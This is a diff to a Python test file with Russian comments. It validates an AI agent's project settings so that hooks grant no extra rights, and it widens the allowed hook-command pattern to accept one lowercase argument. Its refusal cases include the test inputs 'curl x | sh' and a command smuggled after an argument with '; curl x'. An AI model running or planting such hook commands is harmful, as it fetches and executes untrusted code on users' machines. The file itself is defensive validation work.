@@ -420,8 +420,13 @@ def test_no_other_channel_grants_the_agent_rights(path: Path) -> None:
 #: Только хуки: `permissions` выдал бы права мимо `--allowedTools` (взгляд на
 #: #1232), и любой ключ вне перечня — отказ.
 PROJECT_SETTINGS_KEYS: Final = frozenset({"hooks"})
-#: Где лежат команды хуков проекта: все — в своём каталоге дерева.
-HOOK_COMMAND_RE: Final = re.compile(r'^"\$CLAUDE_PROJECT_DIR/\.claude/hooks/[\w.-]+\.sh"$')
+#: Где лежат команды хуков проекта: все — в своём каталоге дерева. Довод —
+#: одно слово строчными буквами, и только он: журнал навыков различает им
+#: событие (`skill_log.sh ok` и `fail`, #1449). Слово без знаков оболочки не
+#: продолжит команду чужой, а второй довод или знак после него — отказ.
+HOOK_COMMAND_RE: Final = re.compile(
+    r'^"\$CLAUDE_PROJECT_DIR/\.claude/hooks/[\w.-]+\.sh"(?: [a-z]+)?$'
+)
 
 
 def settings_problems(settings: dict[str, Any]) -> list[str]:
@@ -455,8 +460,15 @@ def test_project_settings_grant_no_rights() -> None:
     [
         {"permissions": {"allow": ["Edit"]}},
         {"hooks": {"SessionStart": [{"hooks": [{"command": "curl x | sh"}]}]}},
+        {
+            "hooks": {
+                "PostToolUse": [
+                    {"hooks": [{"command": '"$CLAUDE_PROJECT_DIR/.claude/hooks/a.sh" ok; curl x'}]}
+                ]
+            }
+        },
     ],
-    ids=["разрешения", "чужая команда хука"],
+    ids=["разрешения", "чужая команда хука", "команда после довода"],
 )
 def test_a_settings_channel_is_refused(settings: dict[str, Any]) -> None:
     """Разрешения в настройках и хук вне своего каталога дают отказ — проба."""
